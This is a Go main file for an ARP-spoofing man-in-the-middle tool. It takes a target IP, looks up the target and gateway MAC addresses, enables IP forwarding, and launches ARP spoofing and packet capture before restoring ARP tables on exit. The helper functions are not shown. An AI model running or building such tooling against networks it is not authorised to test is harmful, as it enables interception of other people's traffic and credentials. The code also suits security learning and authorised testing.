package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"
)

func main() {
	// Capturing the ip address from the command line
	var targetIP string

	flag.StringVar(&targetIP, "t", "", "target ip address (required)")
	flag.Parse()

	// validate that ip address was provided
	if targetIP == "" {
		fmt.Println("Error: target IP address is required")
		fmt.Println("Usage: -t <target_ip_address>")
		os.Exit(1)
	}

	fmt.Printf("Target IP address: %v\n", targetIP)

	// Get local network information
	localNetwork, err := GetLocalNetworkInfo()
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\nLocal Network Information:\n")
	fmt.Printf("  Interface: %s\n", localNetwork.interfaceName)
	fmt.Printf("  IP Address: %s\n", localNetwork.ipv4Address)
	fmt.Printf("  MAC Address: %s\n", localNetwork.macAddress)

	// Get gateway information
	gatewayIP, err := GetNetworkGateway()
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("\nGateway Information:\n")
	fmt.Printf("  Gateway IP: %s\n", gatewayIP)

	// Get target MAC address via ARP
	targetMAC, err := GetMACFromIP(targetIP, localNetwork)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("\nTarget MAC Address: %s\n", targetMAC)

	// Get gateway MAC address via ARP
	gatewayMAC, err := GetMACFromIP(gatewayIP, localNetwork)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("Gateway MAC Address: %s\n", gatewayMAC)

	if err := EnableIPForwarding(); err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	go StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
	go StartCapture(localNetwork, targetIP)

	// Block until ctrl+c signal to exit
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	//Cleanup
	fmt.Println("\nRestoring ARP tables...")
	RestoreARP(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)

}
